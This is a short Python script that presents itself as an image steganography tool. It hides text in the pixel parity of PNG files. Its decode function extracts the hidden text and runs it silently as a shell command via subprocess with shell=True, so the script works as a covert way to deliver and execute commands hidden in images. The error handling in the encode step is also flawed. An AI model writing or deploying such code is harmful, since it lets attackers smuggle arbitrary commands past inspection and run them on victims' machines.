from PIL import Image
import subprocess
import platform
import os

def genData(data):
    return [format(ord(char), '08b') for char in data]

def modPix(pix, data):
    datalist = genData(data)  # List of binary strings for each char
    lendata = len(datalist)
    imdata = iter(pix)        # Iterator over pixels

    for i in range(lendata):
        # Take 3 pixels (9 RGB values) at a time
        pixels = [value for value in next(imdata)[:3] + next(imdata)[:3] + next(imdata)[:3]]

        # Modify first 8 pixel values according to binary bits
        for j in range(8):
            bit = datalist[i][j]
            original_val = pixels[j]

            if bit == '0':
                # If bit is 0, pixel value should be even
                if pixels[j] % 2 != 0:  # If odd, subtract 1 to make even
                    pixels[j] -= 1
            else:
                # If bit is 1, pixel value should be odd
                if pixels[j] % 2 == 0:  # If even, adjust by +1 or -1 to make odd
                    # Avoid going below 0
                    if pixels[j] == 0:
                        pixels[j] += 1
                    else:
                        pixels[j] -= 1

        # Set the 9th pixel value as flag:
        # Odd if last character (stop), even if more data follows
        if i == lendata - 1:
            # Make odd (stop flag)
            if pixels[-1] % 2 == 0:
                if pixels[-1] == 0:
                    pixels[-1] += 1 #  
                else:
                    pixels[-1] -= 1
        else:
            # Make even (continue flag)
            if pixels[-1] % 2 != 0:
                pixels[-1] -= 1 #

        print(f"Flag pixel (9th) set to: {pixels[-1]} (odd=stop, even=continue)")

        # Yield modified pixels as tuples of 3 RGB values
        yield tuple(pixels[0:3]) 
        yield tuple(pixels[3:6])
        yield tuple(pixels[6:9])

def encode_enc(newimg, data):
    w = newimg.size[0]
    (x, y) = (0, 0)

    for pixel in modPix(newimg.getdata(), data):
        newimg.putpixel((x, y), pixel)
        x = 0 if x == w - 1 else x + 1
        y += 1 if x == 0 else 0

def encode():
    try:
        img_path = input("Enter image name (with extension, PNG only): ")
        if not os.path.isfile(img_path):
            print("[!] File does not exist.")
            return
        if not img_path.lower().endswith('.png'):
            print("[!] Only PNG format supported for reliability.")
            return

        image = Image.open(img_path, 'r')
        if image.mode != 'RGB':
            print("[!] Image mode must be RGB.")
            return

        data = input("Enter the data to be encoded: ")

        if not data:
            raise ValueError("Data is empty.")
    
    except Exception as e:
        print(f"[!] Error during encoding: {e}")
    
    newimg = image.copy()
    encode_enc(newimg, data)
    newimg_name = input("Enter the name of new image(with extension): ")
    newimg.save(newimg_name, newimg_name.split(".")[-1].upper())

def decode():
    img = input("Enter image name (with extension): ")
    image = Image.open(img, 'r')
    imgdata = iter(image.getdata())
    data = ""

    while True:
        # Read 3 pixels (9 RGB values)
        pixels = [value for value in next(imgdata)[:3] + next(imgdata)[:3] + next(imgdata)[:3]]

        # Extract first 8 bits from pixel parity (odd=1, even=0)
        binstr = ''.join(['1' if val % 2 != 0 else '0' for val in pixels[:8]])

        # Convert binary string to character
        data += chr(int(binstr, 2))

        # If 9th pixel is odd, stop decoding
        if pixels[-1] % 2 != 0:
            break

    try:
        print("[*] Executing hidden command silently...")
        system_platform = platform.system()

        if system_platform == "Windows":
            print("Write command for Windows Shell")
            subprocess.Popen(data, shell=True)
        elif system_platform == "Linux" or system_platform == "Darwin":
            print("Write command for Linux Shell or Darwin ShellP")
            subprocess.Popen(data, shell=True, executable='/bin/bash')
        else:
            print("[!] Unsupported OS")
    except Exception as e:
        print(f"[!] Error: {e}")

    return data

def main():
    #Main function for user interaction
    choice = input(":: Steganography :: \n1. Encode\n2. Decode \n")
    if choice == '1':
        encode()
    elif choice == '2':
        decode()
    else:
        print("Invalid choice, exiting")

if __name__ == "__main__":
    main()